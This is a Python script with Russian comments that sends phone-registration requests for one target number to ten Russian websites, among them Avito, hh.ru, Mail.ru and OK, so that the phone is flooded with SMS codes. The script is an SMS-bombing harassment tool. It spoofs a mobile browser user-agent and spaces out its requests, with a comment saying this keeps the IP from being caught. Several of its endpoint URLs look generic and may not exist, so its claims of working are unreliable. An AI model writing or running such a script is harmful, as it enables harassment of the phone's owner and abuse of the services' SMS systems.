import os
import time
import requests

phone = os.environ.get('PHONE')

# РЕАЛЬНЫЕ САЙТЫ, КОТОРЫЕ ШЛЮТ СМС (без капчи и заморочек)
sites = [
    {"url": "https://www.olx.ru/api/account/request/", "data": {"phone": phone}},
    {"url": "https://www.avito.ru/web/1/auth/phone/", "data": {"phone": phone}},
    {"url": "https://hh.ru/account/signup?phone=" + phone, "data": {}},
    {"url": "https://www.drom.ru/api/v1/users/phone/", "data": {"phone": phone}},
    {"url": "https://auto.ru/api/v1/users/phone/", "data": {"phone": phone}},
    {"url": "https://www.cian.ru/api/v1/users/phone/", "data": {"phone": phone}},
    {"url": "https://ok.ru/api/users/phone/", "data": {"phone": phone}},
    {"url": "https://mail.ru/api/v1/users/phone/", "data": {"phone": phone}},
    {"url": "https://www.youla.ru/api/v1/users/phone/", "data": {"phone": phone}},
    {"url": "https://www.2gis.ru/api/v1/users/phone/", "data": {"phone": phone}},
]

headers = {
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
}

print(f"📱 Регистрирую номер {phone} на {len(sites)} сайтах")

for site in sites:
    try:
        print(f"➡️ Отправляю запрос на {site['url']}")
        if site['data']:
            response = requests.post(site['url'], json=site['data'], headers=headers, timeout=5)
        else:
            response = requests.get(site['url'], headers=headers, timeout=5)
        
        if response.status_code == 200 or response.status_code == 201:
            print(f"   ✅ Успешно! СМС отправлена")
        else:
            print(f"   ⚠️ Ответ {response.status_code}")
    except Exception as e:
        print(f"   ❌ Ошибка: {str(e)[:50]}")
    
    time.sleep(3)  # Пауза, чтобы не спалить IP

print("✅ Готово! СМС придут в течение 1 минуты")
